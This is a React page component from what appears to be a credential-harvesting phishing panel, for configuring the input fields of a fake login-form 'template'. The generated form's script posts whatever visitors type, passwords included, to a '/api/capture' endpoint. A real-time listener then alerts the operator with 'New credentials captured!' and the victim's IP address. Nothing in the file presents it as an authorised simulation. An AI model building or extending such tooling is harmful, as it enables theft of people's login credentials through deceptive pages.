import { useState, useEffect, useCallback } from 'react';
import { useParams, useNavigate } from 'react-router';
import { Page } from "components/shared/Page";
import { Card, Button, Input, Select, Modal, Badge } from "components/ui";
import { useThemeContext } from "app/contexts/theme/context";
import { 
  PlusIcon,
  TrashIcon,
  EyeIcon,
  ArrowLeftIcon,
  Cog6ToothIcon,
  BoltIcon,
  DocumentTextIcon
} from '@heroicons/react/24/outline';
import { toast } from 'sonner';
import { pusher } from 'configs/pusher.client.config.js';

export default function TemplateFieldsPage() {
  const { isDark } = useThemeContext();
  const { templateId } = useParams();
  const navigate = useNavigate();
  
  const [template, setTemplate] = useState(null);
  const [fields, setFields] = useState([]);
  const [isLoading, setIsLoading] = useState(true);
  const [isAddingField, setIsAddingField] = useState(false);
  const [isPreviewModalOpen, setIsPreviewModalOpen] = useState(false);
  const [isRealtimeEnabled, setIsRealtimeEnabled] = useState(false);
  
  const [newField, setNewField] = useState({
    field_name: '',
    field_type: 'text',
    field_label: '',
    field_placeholder: '',
    max_length: 255,
    is_required: false,
    field_order: 0
  });

  const fieldTypes = [
    { value: 'text', label: 'Text' },
    { value: 'password', label: 'Password' },
    { value: 'email', label: 'Email' },
    { value: 'tel', label: 'Phone' },
    { value: 'number', label: 'Number' },
    { value: 'url', label: 'URL' }
  ];

  const loadTemplate = useCallback(async () => {
    try {
      const token = localStorage.getItem('authToken');
      const response = await fetch(`/api/templates/${templateId}`, {
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        }
      });

      if (response.ok) {
        const data = await response.json();
        setTemplate(data.data);
      } else {
        toast.error('Failed to load template');
        navigate('/templates');
      }
    } catch (error) {
      console.error('Error loading template:', error);
      toast.error('Failed to load template');
    }
  }, [templateId, navigate]);

  const loadFields = useCallback(async () => {
    try {
      const token = localStorage.getItem('authToken');
      const response = await fetch(`/api/templates/${templateId}/fields`, {
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        }
      });

      if (response.ok) {
        const data = await response.json();
        setFields(data.data || []);
      }
    } catch (error) {
      console.error('Error loading fields:', error);
      toast.error('Failed to load fields');
    } finally {
      setIsLoading(false);
    }
  }, [templateId]);


  const setupRealtime = useCallback(() => {
    // Setup Pusher connection for real-time updates
    try {
      const channel = pusher.subscribe(`template-${templateId}`);
      
      pusher.connection.bind('connected', () => {
        setIsRealtimeEnabled(true);
        console.log('Real-time connection established');
      });
      
      pusher.connection.bind('disconnected', () => {
        setIsRealtimeEnabled(false);
        console.log('Real-time connection closed');
      });
      
      pusher.connection.bind('error', (error) => {
        setIsRealtimeEnabled(false);
        console.error('Pusher error:', error);
      });
      
      channel.bind('new_capture', (data) => {
        if (data.type === 'new_capture') {
          toast.success('New credentials captured!', {
            description: `From IP: ${data.payload.ip_address}`
          });
        }
      });
      
      // Return cleanup function
      return () => {
        pusher.unsubscribe(`template-${templateId}`);
      };
    } catch (error) {
      console.error('Failed to setup Pusher:', error);
      return () => {}; // Return empty cleanup function on error
    }
  }, [templateId]);

  // Initialize data and setup real-time connection
  useEffect(() => {
    loadTemplate();
    loadFields();
    const cleanup = setupRealtime();
    return cleanup;
  }, [templateId, loadTemplate, loadFields, setupRealtime]);

  const addField = async () => {
    try {
      const token = localStorage.getItem('authToken');
      const response = await fetch(`/api/templates/${templateId}/fields`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          ...newField,
          field_order: fields.length
        })
      });

      if (response.ok) {
        toast.success('Field added successfully!');
        setNewField({
          field_name: '',
          field_type: 'text',
          field_label: '',
          field_placeholder: '',
          max_length: 255,
          is_required: false,
          field_order: 0
        });
        setIsAddingField(false);
        loadFields();
      } else {
        const errorData = await response.json();
        toast.error(errorData.message || 'Failed to add field');
      }
    } catch (error) {
      console.error('Error adding field:', error);
      toast.error('Failed to add field');
    }
  };

  const deleteField = async (fieldId) => {
    if (!confirm('Are you sure you want to delete this field?')) {
      return;
    }

    try {
      const token = localStorage.getItem('authToken');
      const response = await fetch(`/api/templates/${templateId}/fields/${fieldId}`, {
        method: 'DELETE',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        }
      });

      if (response.ok) {
        toast.success('Field deleted successfully!');
        loadFields();
      } else {
        const errorData = await response.json();
        toast.error(errorData.message || 'Failed to delete field');
      }
    } catch (error) {
      console.error('Error deleting field:', error);
      toast.error('Failed to delete field');
    }
  };

  const generateFormHTML = () => {
    if (!template || fields.length === 0) {
      return '<div class="text-center p-5"><h3>No fields configured</h3><p>Add some fields to see the form preview.</p></div>';
    }

    const formFields = fields
      .sort((a, b) => a.field_order - b.field_order)
      .map(field => {
        const inputType = field.field_type === 'tel' ? 'tel' : field.field_type;
        const required = field.is_required ? 'required' : '';
        const maxLength = field.max_length ? `maxlength="${field.max_length}"` : '';
        const placeholder = field.field_placeholder ? `placeholder="${field.field_placeholder}"` : '';
        
        return `
          <div class="mb-3">
            <label for="${field.field_name}" class="form-label">${field.field_label || field.field_name}</label>
            <input 
              type="${inputType}" 
              class="form-control" 
              id="${field.field_name}" 
              name="${field.field_name}"
              ${placeholder}
              ${maxLength}
              ${required}
            >
          </div>
        `;
      }).join('');

    return `
      <div class="container mt-5">
        <div class="row justify-content-center">
          <div class="col-md-6">
            <div class="card">
              <div class="card-body">
                <h3 class="card-title text-center mb-4">${template.name}</h3>
                <form id="loginForm" onsubmit="handleSubmit(event)">
                  ${formFields}
                  <div class="d-grid">
                    <button type="submit" class="btn btn-primary">Submit</button>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
      
      <script>
        function handleSubmit(event) {
          event.preventDefault();
          const formData = new FormData(event.target);
          const data = Object.fromEntries(formData.entries());
          
          // Send to capture endpoint
          fetch('/api/capture/${template.slug || templateId}', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
          }).then(() => {
            alert('Form submitted successfully!');
          }).catch(() => {
            alert('Error submitting form');
          });
        }
      </script>
    `;
  };

  if (isLoading) {
    return (
      <Page title="Loading...">
        <div className="flex items-center justify-center h-64">
          <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary-500"></div>
        </div>
      </Page>
    );
  }

  return (
    <Page title={`Fields - ${template?.name || 'Template'}`}>
      <div className="transition-content w-full px-(--margin-x) pt-5 lg:pt-6">
        <div className="min-w-0">
          {/* Header */}
          <div className="mb-8">
            <div className="flex items-center gap-4 mb-4">
              <Button
                variant="outlined"
                onClick={() => navigate('/templates')}
              >
                <ArrowLeftIcon className="h-4 w-4 mr-2" />
                Back to Templates
              </Button>
              <div className="flex items-center gap-2">
                <Badge 
                  variant={isRealtimeEnabled ? "filled" : "outlined"}
                  color={isRealtimeEnabled ? "success" : "secondary"}
                  className="flex items-center gap-1"
                >
                  <BoltIcon className="h-3 w-3" />
                  {isRealtimeEnabled ? 'Real-time Active' : 'Real-time Inactive'}
                </Badge>
              </div>
            </div>
            
            <div className="flex items-center gap-3">
              <div className={`p-3 rounded-xl ${isDark ? 'bg-primary-500/20' : 'bg-primary-100'}`}>
                <Cog6ToothIcon className={`h-6 w-6 ${isDark ? 'text-primary-400' : 'text-primary-600'}`} />
              </div>
              <div>
                <h1 className="text-3xl font-bold text-gray-900 dark:text-white">
                  Template Fields
                </h1>
                <p className="mt-2 text-gray-600 dark:text-gray-400">
                  Configure custom fields for {template?.name}
                </p>
              </div>
            </div>
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
            {/* Fields Configuration */}
            <div>
              <div className="flex items-center justify-between mb-6">
                <h2 className="text-xl font-semibold text-gray-900 dark:text-white">
                  Form Fields ({fields.length})
                </h2>
                <Button
                  variant="filled"
                  color="primary"
                  onClick={() => setIsAddingField(true)}
                >
                  <PlusIcon className="h-4 w-4 mr-2" />
                  Add Field
                </Button>
              </div>

              <div className="space-y-4">
                {fields.map((field) => (
                  <Card key={field.id} className={`p-4 ${isDark ? 'bg-gray-800/50 border-gray-700' : 'bg-white border-gray-200'}`}>
                    <div className="flex items-start justify-between">
                      <div className="flex-1">
                        <div className="flex items-center gap-2 mb-2">
                          <h3 className="font-medium text-gray-900 dark:text-white">
                            {field.field_label || field.field_name}
                          </h3>
                          <Badge variant="outlined" color="secondary">
                            {field.field_type}
                          </Badge>
                          {field.is_required && (
                            <Badge variant="filled" color="error" size="sm">
                              Required
                            </Badge>
                          )}
                        </div>
                        <p className="text-sm text-gray-600 dark:text-gray-400">
                          Name: {field.field_name}
                        </p>
                        {field.field_placeholder && (
                          <p className="text-sm text-gray-600 dark:text-gray-400">
                            Placeholder: {field.field_placeholder}
                          </p>
                        )}
                        <p className="text-sm text-gray-600 dark:text-gray-400">
                          Max Length: {field.max_length} • Order: {field.field_order}
                        </p>
                      </div>
                      <Button
                        variant="outlined"
                        color="error"
                        size="sm"
                        onClick={() => deleteField(field.id)}
                      >
                        <TrashIcon className="h-4 w-4" />
                      </Button>
                    </div>
                  </Card>
                ))}

                {fields.length === 0 && (
                  <div className="text-center py-8">
                    <DocumentTextIcon className="h-12 w-12 text-gray-400 mx-auto mb-4" />
                    <h3 className="text-lg font-medium text-gray-900 dark:text-white mb-2">
                      No fields configured
                    </h3>
                    <p className="text-gray-600 dark:text-gray-400 mb-4">
                      Add some fields to start capturing data from your template.
                    </p>
                    <Button
                      variant="filled"
                      color="primary"
                      onClick={() => setIsAddingField(true)}
                    >
                      <PlusIcon className="h-4 w-4 mr-2" />
                      Add Your First Field
                    </Button>
                  </div>
                )}
              </div>

              <div className="mt-6" style={{ display: 'none' }}>
                <Button
                  variant="outlined"
                  color="info"
                  onClick={() => setIsPreviewModalOpen(true)}
                  className="w-full"
                >
                  <EyeIcon className="h-4 w-4 mr-2" />
                  Preview Form
                </Button>
              </div>
            </div>

          </div>
        </div>
      </div>

      {/* Add Field Modal */}
      <Modal 
        open={isAddingField} 
        onClose={() => setIsAddingField(false)}
        title="Add New Field"
      >
        <div className="space-y-4">
          <div>
            <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
              Field Name *
            </label>
            <Input
              value={newField.field_name}
              onChange={(e) => setNewField(prev => ({ ...prev, field_name: e.target.value }))}
              placeholder="e.g., username, email, phone"
            />
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
              Field Type
            </label>
            <Select
              value={newField.field_type}
              onChange={(e) => setNewField(prev => ({ ...prev, field_type: e.target.value }))}
            >
              {fieldTypes.map(type => (
                <option key={type.value} value={type.value}>
                  {type.label}
                </option>
              ))}
            </Select>
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
              Field Label
            </label>
            <Input
              value={newField.field_label}
              onChange={(e) => setNewField(prev => ({ ...prev, field_label: e.target.value }))}
              placeholder="Display label for the field"
            />
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
              Placeholder Text
            </label>
            <Input
              value={newField.field_placeholder}
              onChange={(e) => setNewField(prev => ({ ...prev, field_placeholder: e.target.value }))}
              placeholder="Placeholder text for the input"
            />
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">
              Max Length
            </label>
            <Input
              type="number"
              value={newField.max_length}
              onChange={(e) => setNewField(prev => ({ ...prev, max_length: parseInt(e.target.value) || 255 }))}
              min="1"
              max="1000"
            />
          </div>

          <div className="flex items-center">
            <input
              type="checkbox"
              id="is_required"
              checked={newField.is_required}
              onChange={(e) => setNewField(prev => ({ ...prev, is_required: e.target.checked }))}
              className="mr-2"
            />
            <label htmlFor="is_required" className="text-sm font-medium text-gray-700 dark:text-gray-300">
              Required field
            </label>
          </div>

          <div className="flex gap-2 pt-4">
            <Button
              variant="outlined"
              onClick={() => setIsAddingField(false)}
              className="flex-1"
            >
              Cancel
            </Button>
            <Button
              variant="filled"
              color="primary"
              onClick={addField}
              className="flex-1"
              disabled={!newField.field_name}
            >
              Add Field
            </Button>
          </div>
        </div>
      </Modal>

      {/* Preview Modal */}
      <Modal 
        open={isPreviewModalOpen} 
        onClose={() => setIsPreviewModalOpen(false)}
        title="Form Preview"
        size="xl"
      >
        <div className="border rounded-lg overflow-hidden" style={{ height: '600px' }}>
          <iframe
            srcDoc={`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Form Preview</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    ${generateFormHTML()}
</body>
</html>`}
            className="w-full h-full"
            title="Form Preview"
            sandbox="allow-scripts allow-same-origin allow-forms"
            frameBorder="0"
          />
        </div>
      </Modal>
    </Page>
  );
}
